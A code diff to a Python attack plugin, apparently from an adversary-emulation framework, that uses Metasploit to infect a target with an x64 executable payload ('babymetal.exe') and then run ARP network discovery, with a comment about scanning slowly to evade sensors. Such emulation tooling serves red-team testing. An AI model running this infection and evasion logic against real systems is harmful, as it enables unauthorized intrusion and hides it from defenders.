@@ -2,8 +2,8 @@
 
 # A plugin to nmap targets slow motion, to evade sensors
 
-from plugins.base.attack import AttackPlugin
-from app.metasploit import MetasploitInstant
+from plugins.base.attack import AttackPlugin, Requirement
+# from app.metasploit import MetasploitInstant
 
 
 class MetasploitArpPlugin(AttackPlugin):
@@ -15,6 +15,7 @@ class MetasploitArpPlugin(AttackPlugin):
     references = ["https://attack.mitre.org/techniques/T1016/"]
 
     required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
+    requirements = [Requirement.METASPLOIT]
 
     def __init__(self):
         super().__init__()
@@ -31,16 +32,14 @@ class MetasploitArpPlugin(AttackPlugin):
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
-        metasploit = MetasploitInstant(self.metasploit_password,
-                                       attack_logger=self.attack_logger,
-                                       attacker=self.attacker_machine_plugin,
-                                       username=self.metasploit_user)
+        # self.connect_metasploit()
 
-        metasploit.smart_infect(target,
-                                payload=payload_type,
-                                payload_name=payload_name,
-                                architecture="x64")
+        self.metasploit.smart_infect(target,
+                                     payload=payload_type,
+                                     outfile=payload_name,
+                                     format="exe",
+                                     architecture="x64")
 
-        metasploit.arp_network_discovery(target)
+        self.metasploit.arp_network_discovery(target)
 
         return res
